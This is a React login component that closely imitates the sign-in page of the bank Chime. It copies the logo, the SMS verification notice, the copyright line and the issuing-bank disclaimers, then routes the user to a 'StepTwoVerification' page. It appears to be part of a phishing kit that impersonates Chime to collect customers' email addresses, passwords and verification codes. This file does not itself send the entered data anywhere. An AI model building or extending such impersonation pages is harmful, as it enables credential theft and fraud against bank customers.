import React from "react";
import "./Login.css";
import { useNavigate } from "react-router-dom";
import logo from "../../assets/chime.png";
import Chat from "../important/Chat";

const Login = () => {
  const navigate = useNavigate();

  const secondStep = (e) => {
    e.preventDefault();
    navigate("/StepTwoVerification");
  };

  return (
    <>
      <Chat />
      <div className="container">
        <img src={logo} alt="" />
        <form className="container-form" onSubmit={secondStep}>
          <input
            className="username input"
            placeholder="Email"
            type="email"
            name=""
            id=""
            required
          />
          <input
            className="password input"
            placeholder="Password"
            type="password"
            name=""
            id=""
            required
          />
          <button>Sign in</button>
          <h2>
            By clicking "Sign in",you agree to receive SMS text <br /> message
            from Chime to verify your identity
          </h2>
          <div className="links">
            <p>Forgot your email address?</p>
            <p>Forgot your password?</p>
            <p>Need to create an account? Sign up!</p>
          </div>
        </form>
        <p className="footer">© 2025 Chime. All Rights Reserved.</p>
        <p className="footer">
          Banking Services provided by The Bancorp Bank, N.A., or Stride Bank,
          N.A.,
          <br /> Members FDIC. The Chime Visa® Debit Card is issued by The
          Bancorp Bank,
          <br /> N.A., or Stride Bank pursuant to a license from Visa U.S.A.
          Inc. and may be
          <br /> used everywhere Visa debit cards are accepted. Please see back
          of your Card <br /> for its issuing bank
        </p>
      </div>
    </>
  );
};

export default Login;
